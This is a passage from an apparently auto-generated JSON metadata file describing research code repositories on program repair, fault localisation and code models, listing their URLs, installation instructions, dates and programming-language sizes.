                    "value": "2021-06-21T09:29:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 178572
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Haskell",
                    "name": "Haskell",
                    "type": "Programming_language",
                    "size": 6238
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 3835
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 1763
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "627": {
        "filename": "lin-tan_clm_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lin-tan/clm",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "* **To download the artifact**, run:\n```\ngit clone https://github.com/lin-tan/clm.git\n```\nThis is enough to obtain all the patches generated by ten code language models evaluated in the paper (referring to RQ1 and RQ2 in the paper). More details can be found in the README.md file.\n\n\n* **To run the code in Docker**, run:\n```\ndocker pull jiang719/clm-apr:latest\ndocker run -it --name clm --gpus all jiang719/clm-apr:latest\ncd /home/CLM\nbash setup.sh\n```\nMore details about running the code to reproduce this paper's results can be found in the README.md file.\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/lin-tan/clm/main/INSTALL.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-23T21:10:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T08:22:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 340305
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 61100
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 938
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "628": {
        "filename": "shangqing-liu_GraphSearchNet_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/shangqing-liu/GraphSearchNet",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-12-11T07:11:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-14T15:15:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 145693
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "629": {
        "filename": "kth_SequenceR_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/sequencer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Choose a directory and:\n```bash\ngit clone https://github.com/OpenNMT/OpenNMT-py\n```\nWhen testing a new configuration, copy a working data directory and modify *sh files as desired.\n\nSet up environment variables:\n\n```bash\nexport CUDA_VISIBLE_DEVICES=0\nexport THC_CACHING_ALLOCATOR=0\nexport OpenNMT_py=.../OpenNMT-py\nexport data_path=.../results/Golden  # Or a new directory path as desired\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "SequenceR: Sequence-to-Sequence Learning for End-to-End Program Repair",
                        "Model creation, training and use:"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/kth/SequenceR/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To rerun our experiment of SequenceR over [Defects4J](https://github.com/rjust/defects4j). Run `src/Defects4J_Experiment/Defects4J_experiment.sh`, make sure you have `defects4j` installed. \n",
                    "original_header": "Defects4J experiment"
                },
                "confidence": 0.9945422490173241,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/kth/SequenceR/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-11-27T10:35:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-14T04:26:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 73385569
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 38525
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 33404
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 7059
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 6341
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2010
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "630": {
        "filename": "nicolas-hbt_pygraft_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/nicolas-hbt/pygraft",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The latest stable version of PyGraft can be downloaded and installed from [PyPI](https://pypi.org/project/pygraft) with:\n\n```bash\npip install pygraft\n```\n\nThe latest version of PyGraft can be installed directly from [GitHub](https://github.com/nicolas-hbt/pygraft) source with:\n\n```bash\npip install git+https://github.com/nicolas-hbt/pygraft.git\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "<a href=\"https://arxiv.org/pdf/2309.03685.pdf\">PyGraft: Configurable Generation of Synthetic Schemas and Knowledge Graphs at Your Fingertips</a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/nicolas-hbt/pygraft/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-09-07T04:28:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T04:47:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 129907
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "631": {
        "filename": "nadiinchi_dynamic_embeddings_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/nadiinchi/dynamic_embeddings",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The experiments were conducted on the [Python150k](https://www.sri.inf.ethz.ch/py150) and [JavaScript150k](https://www.sri.inf.ethz.ch/js150) datasets, resplitted according to https://github.com/bayesgroup/code_transformers. Please follow [this instruction](https://github.com/bayesgroup/code_transformers/tree/main/data_utils) to obtain data. \n \n",
                    "original_header": "Data"
                },
                "confidence": 0.9497147611959225,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nadiinchi/dynamic_embeddings/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Parts of this code are based on the following repositories:\n* [A Transformer-based Approach for Source Code Summarization](https://github.com/wasiahmad/NeuralCodeSum) \n* [OpenNMT](https://github.com/OpenNMT/OpenNMT-py)\n* [DrQA](https://github.com/facebookresearch/DrQA)\n* https://github.com/oleges1/code-completion\n \n",
                    "original_header": "Attribution"
                },
                "confidence": 0.9940366789450907,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nadiinchi/dynamic_embeddings/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-04-10T20:31:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-27T12:30:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 167455
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "632": {
        "filename": "CMGeval_Evaluating-CMG_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/CMGeval/Evaluating-CMG",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please install the neccessary libraries before running our codes: \n- python==3.6.9\n- nltk==3.4.5\n- numpy==1.16.5\n- scikit-learn==0.22.1\n \n",
                    "original_header": "Implementation Environment"
                },
                "confidence": 0.9959214005096995,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/CMGeval/Evaluating-CMG/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n| Number | PL |\n| ------------- | ----------------- |\n| 1 | C++ (C plus plus)|\n| 2 | C# (C sharp)|\n| 3 | Java (Java)|\n| 4 | JS (Javascript)|\n| 5 | Py (Python)| \n",
                    "original_header": "Data &amp; Models:"
                },
                "confidence": 0.9928077588803804,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/CMGeval/Evaluating-CMG/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-10-15T18:16:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-20T11:08:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 362469
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "633": {
        "filename": "ARiSE-Lab_VELVET_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ARiSE-Lab/VELVET",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-12-20T21:47:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-25T10:05:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 52754
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "634": {
        "filename": "Ahmadreza-SY_TCP-CI_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Ahmadreza-SY/TCP-CI",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "This project is tested on Python 3.7+. The required Python dependencies can be installed via the following command:\n```bash\npip install -r requirements.txt\n```",
                    "type": "Text_excerpt",
                    "original_header": "Python Environment",
                    "parent_header": [
                        "Scalable and Accurate Test Case Prioritization in Continuous Integration Contexts",
                        "Environment Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Ahmadreza-SY/TCP-CI/main/Readme.md"
            },
            {
                "result": {
                    "value": "Understand is a code analysis enterprise software with a wide variety of [supported languages](https://support.scitools.com/support/solutions/articles/70000582794-supported-languages) which provides static dependencies available in a source code between files, functions, classes, etc. For more details on the feature of this software, visit [this link](https://scitools.com/features). In this project, we utilize Understand to create static dependency graphs to collect a part of our features. \n\nIn this section, we will explain how to install and set up Understand to obtain a file with `.und` format which is the output of Understand's analysis. Note that this project needs Understand's database for extracting features and will not work without it.\n",
                    "type": "Text_excerpt",
                    "original_header": "Understand",
                    "parent_header": [
                        "Scalable and Accurate Test Case Prioritization in Continuous Integration Contexts",
                        "Environment Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Ahmadreza-SY/TCP-CI/main/Readme.md"
            },
            {
                "result": {
                    "value": "You can download the latest stable version of Understand from [this link](https://licensing.scitools.com/download). To run this project, you need to add the `und` command to your PATH environment variable so the `und` command is recognized in the shell. `und` is located in the `bin` directory of Understand's software.\n\n```bash\nexport PATH=\"$PATH:/path/to/understand/scitools/bin/linux64\"\n```\n\nFinally, run the following command to make sure `und` is successfully installed:\n\n```bash\n$ und version\n(Build 1029)\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Understand's CLI",
                    "parent_header": [
                        "Scalable and Accurate Test Case Prioritization in Continuous Integration Contexts",
                        "Environment Setup",
                        "Understand"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Ahmadreza-SY/TCP-CI/main/Readme.md"
            },
            {
                "result": {
                    "value": "This project has been tested on *Build 1029* of Understand on Linux (specifically Ubuntu). It may require minor compatibility changes if it is used on other Understand builds or other operating systems.\n",
                    "type": "Text_excerpt",
                    "original_header": "Note",
                    "parent_header": [
                        "Scalable and Accurate Test Case Prioritization in Continuous Integration Contexts",
                        "Environment Setup",
                        "Understand"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Ahmadreza-SY/TCP-CI/main/Readme.md"
            },
            {
                "result": {
                    "value": "Unlike typical projects, Understand does not provide its Python library in the well-known pip package installer, and you need to manually add the package to your Python environment. The instructions for adding the package are explained in [this link](https://support.scitools.com/support/solutions/articles/70000582852-getting-started-with-the-python-api).\n",
                    "type": "Text_excerpt",
                    "original_header": "Adding Understand Python Package/Library",
                    "parent_header": [
                        "Scalable and Accurate Test Case Prioritization in Continuous Integration Contexts",
                        "Environment Setup",
                        "Understand"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Ahmadreza-SY/TCP-CI/main/Readme.md"
            },
            {
                "result": {
                    "value": "This project uses [RankLib](https://sourceforge.net/p/lemur/wiki/RankLib) for training and testing machine learning ranking models. RankLib is a library of learning-to-rank algorithms, and it is written in Java. Hence, this project requires Java for running training and testing experiments. This project is trained and tested on OpenJDK version `1.8.0_292` and `11.0.11`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Java",
                    "parent_header": [
                        "Scalable and Accurate Test Case Prioritization in Continuous Integration Contexts",
                        "Environment Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Ahmadreza-SY/TCP-CI/main/Readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-23T16:00:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-16T10:50:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 200554
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "635": {
        "filename": "prog-autom_hidden-demo_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/prog-autom/hidden-demo",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-12-01T14:08:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-02T10:57:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 14216
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 363
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "636": {
        "filename": "coinse_fonte_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/coinse/fonte",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installation\n1. Install Python 3.9 on your machine\n    - If using `pyenv`, use these commands:\n\n      ```\n      pyenv install 3.9.1\n      pyenv local 3.9.1\n      ```\n2. Install the required Python packages:\n    ```\n    python -m pip install numpy==1.21.0 pandas==1.4.3 scipy==1.9.0 tqdm matplotlib==3.4.0 seaborn==0.11.1 rank-bm25==0.2.2 tabulate==0.8.9 jupyter setuptools\n    python -m pip install lib/SBFL\n    python -m pip install lib/spiral\n    ```\n\n3. Verify the installation by running Fonte using the following sample command:\n    ```bash\n    python Fonte.py data/Defects4J/core/Cli-29b -o output.csv\n    # Number of total commits: 616\n    #          vote  rank  is_style_change\n    # commit\n    # c0d5c79   1.0   1.0            False\n    # 147df44   0.0   2.0             True\n    ```\n---\n**Note: The following steps are only needed for future extension**\n\n4. Download the [Docker client](https://www.docker.com/products/docker-desktop/) and start the Docker daemon\n\n5. Verify the Docker installation by running these command:\n    ```bash\n    docker pull agb94/fonte:latest\n    ```\n    Please note that due to the large size of the image, the download process may take some time.\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/coinse/fonte/main/INSTALL.md"
            },
            {
                "result": {
                    "value": "- Hardware\n  - Developed under Mac with Intel chip\n  - Compatible with AMD64 processors\n- Software\n  - Tested with bash (recommended), zsh, PowerShell\n  - Python 3.9+\n    - If using `pyenv`, use these commands:\n      ```bash\n      pyenv install 3.9.1\n      pyenv local 3.9.1\n      ```\n    - **Install dependencies**:\n        ```bash\n        pip install --upgrade pip\n        python -m pip install numpy pandas scipy tqdm matplotlib seaborn rank-bm25 tabulate jupyter setuptools\n        python -m pip install lib/SBFL\n        # Alternative: python -m pip install git+https://github.com/Suresoft-GLaDOS/SBFL \n        python -m pip install lib/spiral\n        # Alternative: python -m pip install git+https://github.com/casics/spiral\n        ```\n  - [Docker client](https://www.docker.com/products/docker-desktop) (only for the future extension)\n",
                    "type": "Text_excerpt",
                    "original_header": "**A. Environmental Setup**",
                    "parent_header": [
                        "**Fonte: Finding Bug Inducing Commit From Failure (ICSE'23)**"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/coinse/fonte/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "![Fonte_Logo](./fonte.png)\n```\ngit clone git@github.com:coinse/fonte.git\n```\n \n|File|Description|\n|------------------------------------|----------------|\n|\ud83d\udcc4 [PREPRINT](./preprint.pdf) | Preprint of the paper |\n|\ud83d\udda5 [REQUIREMENTS](./REQUIREMENTS.md)| HW/OS/SW requirements |\n|\ud83d\udd28 [INSTALL](./INSTALL.md)| Installation guide |\n|\ud83e\udeaa [LICENSE](LICENSE)|MIT license|  \n- Instructions for setting up the environment, including required hardware and software (Python and Docker) and information on how to install dependencies\n- Instructions for running Fonte, including an example command and a list of available arguments\n- Instructions for reproducing the experiment results, including information on using a Jupyter notebook\n- Optional instructions for extracting the core data for other Defects4J faults using a pre-built Docker image\n- Information on the structure of the data directory and the location of the core data and BIC dataset\n \n",
                    "original_header": "**Fonte: Finding Bug Inducing Commit From Failure (ICSE'23)**"
                },
                "confidence": 0.9950483738608407,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/coinse/fonte/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Run the Jupyter notebook\n    ```bash\n    jupyter notebook\n    ```\n    If you're a VSCode user, just install the `Jupyter` extension.\n2. Open `experiment.ipynb` and run the cells to reproduce our experiment results.\n    - The output will be saved to `./experiment_results/`. Note that the directory already contains the pre-computed results. If you want to fully replicate our experiments, remove all files from the `./experiment_results/` and run the cells again.\n \n",
                    "original_header": "**C. Reproducing the experiment results**"
                },
                "confidence": 0.9999999943003104,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/coinse/fonte/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Pull the image from DockerHub. This may take a while because the image size is about 4GB.\n    ```bash\n    docker pull agb94/fonte:latest\n    ```\n2. Start a Docker container\n    BASH2*\n    - The directory `./docker/workspace` in the local machine will share data with `/root/workspace` in the container.\n    - `$(pwd)`: The current directory. Change it to `${PWD}` or `%cd%` if you're using PowerShell or Windows Command Prompt, respectively.\n3. Collect the coverage information and the commit history of `<pid>-<vid>b`\n    BASH3*\n    - The output will be saved to `./docker/workspace/data/<pid>-<vid>b/`\n    - Don't forget to append the tool option (`git` or `shovel`)!\n4. Run Fonte on the newly collected data:\n    BASH4*\n    \ud83d\udca1 To **speed up** the AST comparison, you can disable code formatting using OpenRewrite by appending `false` when calling the `collect_core.sh` script:\n    \n    BASH5*\n \n",
                    "original_header": "**D. Extension for other Defects4J faults** (Optional)"
                },
                "confidence": 0.9999993691326097,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/coinse/fonte/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-16T01:53:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-09T13:36:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "637": {
        "filename": "ise-uiuc_Repilot_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ise-uiuc/Repilot",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"left\">\n    <a href=\"https://arxiv.org/abs/2309.00608\"><img src=\"https://img.shields.io/badge/arXiv-2309.00608-b31b1b.svg?style=for-the-badge\">\n    <a href=\"https://doi.org/10.5281/zenodo.8281250\"><img src=\"https://img.shields.io/badge/DOI-10.5281%2Fzenodo.8281250-blue?style=for-the-badge\">\n    <a href=\"https://hub.docker.com/r/universefly/repilot/tags\"><img src=\"https://img.shields.io/badge/docker-universefly%2Frepilot-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white\"></a>\n</p> \n",
                    "original_header": "\u2699\ufe0f$`\\mathbb{R}\\mathrm{e}\\mathbf{pilot}`$\ud83d\udee0\ufe0f"
                },
                "confidence": 0.9989119940382889,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/Repilot/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-29T05:21:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T16:51:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 301488
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1754
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "638": {
        "filename": "XMUDM_BASTS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/XMUDM/BASTS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\t**Note**: You can skip this step, directly download our processed dataset `split_test/train/valid_ast.json` and proceed to the next step. \n",
                    "original_header": "Step through"
                },
                "confidence": 0.9975117885808282,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/XMUDM/BASTS/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-08T02:47:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-14T14:05:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 960277
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 237812
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "NewLisp",
                    "name": "NewLisp",
                    "type": "Programming_language",
                    "size": 225803
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 94220
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 2329
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1060
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "639": {
        "filename": "jingpu_Halide-HLS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jingpu/Halide-HLS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The current compiler is based on Halide release 2017/05/03 (https://github.com/halide/Halide/releases). \nIntructions for building examples can be found at the wiki page:\nhttps://github.com/jingpu/Halide-HLS/wiki \nIf you want to build the compiler in other settings, please refer to the original readme:\nhttps://github.com/jingpu/Halide-HLS/blob/HLS/README.orig.md \n",
                    "original_header": "Halide to CPU/FPGA"
                },
                "confidence": 0.9998946331089562,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jingpu/Halide-HLS/HLS/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Linux                        |\n|------------------------------|\n| [![linux build status][1]][2]| \n[1]: https://travis-ci.org/jingpu/Halide-HLS.svg?branch=HLS\n[2]: https://travis-ci.org/jingpu/Halide-HLS \n",
                    "original_header": "Build Status"
                },
                "confidence": 0.9965701585270479,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jingpu/Halide-HLS/HLS/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-08-21T00:32:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-20T11:27:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 7579638
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 441468
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 210803
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 164899
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "LLVM",
                    "name": "LLVM",
                    "type": "Programming_language",
                    "size": 124268
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 108778
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 91675
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
